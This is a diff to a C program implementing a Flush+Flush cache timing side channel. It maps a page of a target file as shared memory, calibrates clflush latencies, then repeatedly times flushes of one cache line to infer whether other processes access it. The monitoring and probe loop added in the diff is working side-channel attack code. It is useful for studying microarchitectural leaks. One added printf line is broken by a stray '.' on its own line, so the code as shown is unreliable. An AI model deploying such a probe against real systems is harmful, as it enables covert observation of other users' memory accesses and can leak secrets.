@@ -78,8 +78,6 @@ double seconds(void) {                      // Read a clock independent of TSC H
     return t.tv_sec + t.tv_nsec / 1e9;       // Convert to seconds.
 }                                           // End seconds.
 
-
-
 int main(int argc, char **argv) {            // Main program.
     setvbuf(stdout, NULL, _IOLBF, 0);        // Print complete lines promptly.
     if (argc < 3 || argc > 5) {              // Require file and hexadecimal offset.
@@ -96,21 +94,16 @@ int main(int argc, char **argv) {            // Main program.
     }                                       // End count check.
 
     unsigned int a, b, c, d;                 // Storage for CPU feature registers.
-
-
     if (!__get_cpuid(1, &a, &b, &c, &d) || !(d & (1u << 19)) || !(d & (1u << 4))) { // Check CLFLUSH/TSC.
         puts("CPU must support CLFLUSH and TSC."); return 1; // Stop on unsupported hardware.
     }                                       // End feature check.
-
-
     cpu_set_t allowed, chosen;              // Allowed CPUs and selected CPU.
+
     if (sched_getaffinity(0, sizeof allowed, &allowed)) { perror("affinity"); return 1; } // Read allowed CPUs.
     int cpu = 0;                            // Start looking at logical CPU zero.
 
-
     while (cpu < CPU_SETSIZE && !CPU_ISSET(cpu, &allowed)) ++cpu; // Find first permitted CPU.
     if (cpu == CPU_SETSIZE) { puts("No allowed CPU."); return 1; } // Reject an empty set.
-
 
     CPU_ZERO(&chosen); CPU_SET(cpu, &chosen); // Select only that CPU, respecting taskset.
 
@@ -125,9 +118,9 @@ int main(int argc, char **argv) {            // Main program.
     if (fstat(fd, &st)) { perror("fstat"); close(fd); return 1; } // Read file size/type.
 
     if (!S_ISREG(st.st_mode) || st.st_size <= 0 || offset >= (uint64_t)st.st_size) { // Validate target.
+
         puts("File must be nonempty and offset must be inside it."); close(fd); return 1; // Reject invalid file.
     }                                       // End file validation.
-
 
     long page = sysconf(_SC_PAGESIZE);       // Read the operating-system page size.
 
@@ -136,6 +129,7 @@ int main(int argc, char **argv) {            // Main program.
     size_t within = offset % (uint64_t)page; // Position of target inside its page.
 
     unsigned char *map = mmap(NULL, within + 1, PROT_READ, MAP_SHARED, fd, (off_t)(offset - within)); // Map target page.
+
     close(fd);                              // The mapping keeps its own file reference.
 
     if (map == MAP_FAILED) { perror("mmap"); return 1; } // Check mapping success.
@@ -147,17 +141,76 @@ int main(int argc, char **argv) {            // Main program.
     printf("CPU %d | target %s + 0x%" PRIx64 "\nCalibrating...\n", cpu, argv[1], offset); // Show selected target.
 
     for (int i = 0; i < 200; ++i) (void)sample(addr, i & 1); // Warm up both conditions.
-    
+
     for (int i = 0; i < N; ++i) {            // Collect calibration sample pairs.
+
         if (i & 1) { cold[i] = sample(addr, 0); hot[i] = sample(addr, 1); } // Flushed first on odd iterations.
         else { hot[i] = sample(addr, 1); cold[i] = sample(addr, 0); } // Cached first on even iterations.
     }                                       // End calibration collection.
-
 
     qsort(hot, N, sizeof hot[0], compare);  // Sort cached timings.
 
     qsort(cold, N, sizeof cold[0], compare); // Sort flushed timings.
 
     uint64_t h = hot[N / 2], m = cold[N / 2]; // Take middle sorted values as medians.
-    
     uint64_t threshold = h < m ? h + (m - h) / 2 : m + (h - m) / 2; // Midpoint threshold.
+
+     int slower = h > m, false_hot = 0, missed_hot = 0; // Direction and validation errors.
+
+    for (int i = 0; i < N; ++i) {            // Check the threshold using fresh samples.
+
+        uint64_t x = sample(addr, 0), y = sample(addr, 1); // Prepare flushed and cached conditions.
+        false_hot += slower ? x > threshold : x < threshold; // Count false cached-like results.
+        missed_hot += slower ? y <= threshold : y >= threshold; // Count missed cached samples.
+    }                                       // End validation.
+
+    int reliable = h != m && false_hot <= N / 10 && missed_hot <= N / 10; // Heuristic 10% error limits.
+
+    printf("Cached median: %" PRIu64 " | Flushed median: %" PRIu64 " TSC ticks\n", h, m); // Print calibration medians
+    .
+    printf("Threshold: %" PRIu64 " | cached-like means %s threshold\n", threshold, slower ? ">" : "<"); // Show comparison rule.
+
+    printf("Validation: false cached-like %.1f%% | missed cached %.1f%%\n", 100.0 * false_hot / N, 100.0 * missed_hot / N); // Show errors.
+
+    if (!reliable) puts("WARNING: weak separation; probe labels will be uncertain."); // Avoid overstating detection.
+
+    puts("Monitoring: timed flushes only. Ctrl+C stops the program."); // Start progress output.
+
+    _mm_clflush(addr); _mm_mfence();         // Begin with a flushed line.
+
+    double start = seconds();               // Save start time for elapsed seconds.
+
+    uint64_t hits = 0, minimum = UINT64_MAX, maximum = 0; // Initialize statistics.
+
+    long double total = 0;                  // Sum probe timings for the mean.
+
+    for (uint64_t i = 1; i <= count; ++i) {   // Run the requested number of probes.
+
+        for (int j = 0; j < 30; ++j) sched_yield(); // Offer scheduling opportunities between flushes.
+
+        uint64_t delta = flushandflush(addr); // Time only a flush of the target.
+
+        int hit = slower ? delta > threshold : delta < threshold; // Tentative cached-like result.
+
+        hits += hit; total += delta;        // Accumulate count and timing sum.
+
+        if (delta < minimum) minimum = delta; // Update minimum timing.
+
+        if (delta > maximum) maximum = delta; // Update maximum timing.
+
+        if (i == 1 || i % every == 0 || i == count) { // Print first, periodic and final probes.
+            printf("Probe %" PRIu64 ": Flush latency=%" PRIu64 " TSC ticks | %s | elapsed=%.6f s\n", i, delta, reliable ? (hit ? "cached-like" : "uncached-like") : "uncertain", seconds() - start); // Print probe data.
+        }                                   // End print condition.
+
+    }                                       // End monitoring loop.
+
+    printf("\nFinished: %" PRIu64 " probes in %.6f seconds\n", count, seconds() - start); // Print run length.
+
+    printf("Timing: min=%" PRIu64 " mean=%.2Lf max=%" PRIu64 " TSC ticks\n", minimum, total / count, maximum); // Print timing summary.
+
+    if (reliable) printf("Cached-like: %" PRIu64 "/%" PRIu64 " (%.2f%%); not confirmed victim accesses.\n", hits, count, 100.0 * hits / count); // Print tentative detections.
+    
+    else puts("Detection count withheld: calibration was unreliable."); // Do not present unreliable counts.
+    munmap(map, within + 1);                 // Release the mapping after normal completion.
+    return 0;                               // Indicate success.
+}                                           // End main.
